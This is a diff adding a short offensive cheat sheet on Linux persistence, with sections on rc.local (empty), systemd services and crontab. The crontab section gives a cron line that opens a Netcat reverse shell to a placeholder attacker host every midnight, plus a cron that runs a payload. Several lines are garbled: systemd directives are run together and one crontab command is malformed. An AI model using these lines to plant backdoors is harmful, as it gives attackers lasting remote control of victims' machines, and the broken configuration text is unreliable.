@@ -1,1 +1,47 @@
 
+-- rc.local --
+
+
+
+-- Linux Service --
+
+# Create/Open new  service file using nano
+nano /etc/systemd/system/<SERVICE_NAME>.service
+
+# Add service information to file.<FILE_PATH> is full path to .sh file to execute on startup
+[Unit]
+after=network.targetDescription=My Service description
+
+# When done, press CTRL+X, then press 'Y', then press 'Enter' to save and close the file with nano
+[Service]
+Type=simple Restart=always ExecStart=<FILE_PATH>
+
+[Install]
+WantedBy=multi-user.target
+
+# Reload service manage
+
+
+
+
+
+-- Crontab --
+
+## Create cronthat runs a Netcat reverse shell every day at midnight
+
+#Open new crontab:
+crontab -e
+
+#Add the following line at the end:
+0 0 * * * nc <ATTACKER_IP> <ATTACKER_PORT> -e /bin/sh
+
+
+## Create cron that runs a payload every day at midnight
+
+#Open new crontab:
+crontab -e
+
+#Add the following line at the end:
+crontab -e 0 0 * * * <FULLPATH>
+
+https://crontab.guru/
